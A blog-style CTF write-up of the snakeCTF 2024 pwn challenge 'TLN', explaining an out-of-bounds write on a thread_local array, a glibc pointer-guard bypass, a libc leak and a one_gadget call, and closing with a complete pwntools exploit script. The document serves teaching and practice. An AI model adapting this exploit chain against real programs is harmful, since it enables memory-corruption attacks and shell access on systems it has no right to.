+++
title = 'TLN - snakeCTF 2024'
date = 2024-09-09T08:46:34+02:00
draft = false
+++

this weekend I played snakeCTF for fun and managed to solve a few pwns. one of them was TLN.
the challenge code was pretty simple, introducing a classical oob index vulnerability:
```c
case OPT_SET:
    print("Index: ");
    index = get_int();

    print("Content: ");
    read_exact(&(notes[index].content), sizeof(item_t) - 1);
    notes[index].content[sizeof(item_t) - 1] = 0;
    break;
```
as you can see, no bounds checks at all.
the `notes` array consists of elements of `item_t`, which is defined like the following:
```c
typedef struct {
    char content[8];
} item_t;
```
to sum it up: we can write 7 bytes at a time relative to the starting address of `notes`.
the declaration of the array is what's particulary interesting. the keyword `thread_local` is used here:
```c
static thread_local item_t notes[SIZE];
```
what does `thread_local` mean tho? according to the C17 standard it means:
> An object whose identifier is declared with the storage-class specifier thread_local has thread
> storage duration. Its lifetime is the entire execution of the thread for which it is created, and its
> stored value is initialized when the thread is started. There is a distinct object per thread, and use of
> the declared name in an expression refers to the object associated with the thread evaluating the
> expression. The result of attempting to indirectly access an object with thread storage duration from
> a thread other than the one with which the object is associated is implementation-defined
well, what's even more interesting to us as pwners is where it lies in memory in the first place.
you would think it lies on the stack just as other local variables, but that is not the case.
in fact, the array is contained in a memory region right in front of `glibc` mappings.

the first element resides at `region+0x740`:
```
0x7b413cef4740:	0x0041414141414141	0x0000000000000000
```
since we got an oob write, it's interesting to us what's after the array data.
at index `SIZE` (which is 256) we can find some interesting stuff:
```
0x7b413cef4f40:	0x00007b413cef4f40	0x00007b413cef58e0
0x7b413cef4f50:	0x00007b413cef4f40	0x0000000000000000
0x7b413cef4f60:	0x0000000000000000	0x06b455b9b6b1a300
0x7b413cef4f70:	0xbc2b02f7ccca2b77
```
the address `0x00007b413cef4f40` is actually the start of our data added with `0x800`!
if we change that, we can trick the program that our array lies somewhere else (as we specify).
that'd allow us to even write to addresses lower that our current array address (useful, because we can't write to -1 and lower).

however I made use of something more interesting. the value `0xbc2b02f7ccca2b77` seems like total gibberish.
but when trying to corrupt it, you get a `SIGSEGV` at a call as soon as you exit the program.
I later found out, that `0xbc2b02f7ccca2b77` get's xor'ed with a secret key, so it get's a valid address.
we want a valid (and custom) address to call, so it'd be nice to know that secret key.

lucky for us, that key is in an rw segment of the libc, which we can just zero out.
overwriting `0xbc2b02f7ccca2b77` with a custom address now leads to a call to that exact address.

now what to we call? we still nead some libc leaks in order to do something.
that's why I chose `_start` as a function to call. you may ask: how can we leak with that?

we will eventually end up at the following instruction in `__libc_start_main`:
```
<__libc_start_main+150>:	mov    rax,QWORD PTR [r15+0xa0]
<__libc_start_main+157>:	...
<__libc_start_main+166>:	mov    rax,QWORD PTR [rax+0x8]
<__libc_start_main+170>:	...
<__libc_start_main+176>:	add    rax,QWORD PTR [r15]
<__libc_start_main+179>:	call   rax
```
this enables us another call, since we control the value contained in the address of `r15`.
however this time with much better arguments:
```
*0x4141414141414141 (
   $rdi = 0x0000000007834891,
   $rsi = 0x00007ffff1341d40,
   $rdx = 0x00007ffff1341ed8
)
```
if we could now set `rdi` to `0` and call `write` we would have a leak. luckily we can do that.
we can jump to `main+14`:
```
0x000000000040107e <+14>:	mov    edi,0x1
0x0000000000401083 <+19>:	call   0x401030 <write@plt>
0x0000000000401088 <+24>:	call   0x4012c0 <chall>
```
we now leak a ton of data (including libc) and we can continue using the program without exit'ing.
now we can do the same procedure but instead call a one_gadget. I decided for that one:
```
0xe39fb execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```
from our call primitive from the beginning, `rdi` was `0`, but `r12` had some value in it.
again, luckily there was an `rw` address in libc where `r12` was loaded from before.
if we set `r12` to `0` and call `exit`, one_gadget is executed we get a shell:
```
[*] Switching to interactive mode
 1. Set item
2. Get item
3. Exit
> Index: Content: err: read
/bin/sh: 1: AAAAAA: not found
$ cat flag
snakeCTF{fake_flag}
```
the full exploit is here:
```py
from pwn import *

def set_item(idx, data):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Index:", str(int(idx)).encode("ascii"))
    p.sendafter(b"Content:", data)

p = process("./tln")
#p = process(["ncat", "--ssl", "thread-local-notes.challs.snakectf.org", "1337"])

ld_off = 0x239000

off_null = 0x740
off_off = ld_off + 0x2e0
off_xor = 0x1ebfd8
off_r12 = 0x1ebfa0

start = 0x4010a0

idx = (off_off - off_null) / 0x8
set_item(idx, p64(0x7e)[:-1])

idx = (off_xor - off_null) / 0x8
set_item(idx, p64(0x0)[:-1])

idx = 262 # rip
set_item(idx, p64(start)[:-1])

p.sendline(b"3")
p.recvuntil(b"Bye!")
leak = p.recvuntil(b"1. Set item")

libc_leak = u64(leak[89:97])
libc_base = libc_leak - 0x4295e
one_gadget = libc_base + 0xe39fb + 0x3000
print(hex(libc_base))

idx = (off_r12 - off_null) / 0x8
set_item(idx, p64(0x0)[:-1])

idx = (off_off - off_null) / 0x8
set_item(idx, p64(0x7e)[:-1])

idx = (off_xor - off_null) / 0x8
set_item(idx, p64(0x0)[:-1])

idx = 262 # rip
set_item(idx, p64(one_gadget)[:-1])

p.sendline(b"1")
p.sendline(b"-1")
p.sendline(b"AAAAAA")

p.interactive()
```